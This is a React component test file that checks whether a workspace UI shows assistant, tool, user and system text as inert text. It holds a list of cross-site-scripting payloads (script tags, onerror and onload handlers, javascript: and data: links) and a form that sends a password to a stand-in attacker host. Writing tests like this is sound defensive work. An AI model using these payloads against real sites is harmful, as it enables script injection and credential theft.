// @vitest-environment jsdom
import { cleanup, render } from "@testing-library/react"
import { afterEach, describe, expect, it } from "vitest"
import { ItemView } from "../src/surfaces/Workspace"

afterEach(cleanup)

/**
 * Threat: text from the model or from a tool (which can be written by a web page or a file Claude read) is
 * shown on the screen where you make decisions. It must never become live markup or a script.
 */
const HOSTILE = [
  "<img src=x onerror=alert(1)>",
  "<script>alert(1)</script>",
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:alert(1)">click</a>',
  "[click](javascript:alert(1))",
  "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "<svg onload=alert(1)>",
  "<style>body{display:none}</style>",
  '<form action="https://evil.example"><input name=password></form>',
]

describe("threat: markup in text shown to the user", () => {
  it("assistant text with raw HTML stays text, and no script, frame, form or handler is created", () => {
    const { container } = render(
      <ItemView item={{ id: "1", kind: "text", text: HOSTILE.join("\n\n") }} />,
    )
    expect(container.querySelector("script, iframe, form, input, style, svg, img")).toBeNull()
    for (const el of container.querySelectorAll("*")) {
      for (const a of el.getAttributeNames()) expect(a.toLowerCase().startsWith("on")).toBe(false)
    }
    for (const a of container.querySelectorAll("a"))
      expect(a.getAttribute("href") ?? "").not.toMatch(/^\s*(javascript|data|vbscript):/i)
    expect(container.textContent).toContain("alert(1)")
  })

  it("a shell command or a tool result containing markup is shown as plain text", () => {
    const payload = "echo '<img src=x onerror=alert(1)>' && <script>alert(1)</script>"
    const { container } = render(
      <ItemView
        item={{
          id: "2",
          kind: "tool",
          toolUseId: "t",
          name: "Bash",
          input: { command: payload },
          result: { text: payload, isError: false },
        }}
      />,
    )
    expect(container.querySelector("script, img")).toBeNull()
    expect(container.textContent).toContain(payload)
  })

  it("user text and system lines are text too", () => {
    const { container } = render(
      <>
        <ItemView item={{ id: "3", kind: "user", text: HOSTILE[0]! }} />
        <ItemView item={{ id: "4", kind: "system", text: HOSTILE[1]! }} />
      </>,
    )
    expect(container.querySelector("script, img")).toBeNull()
    expect(container.textContent).toContain("<img src=x onerror=alert(1)>")
  })
})
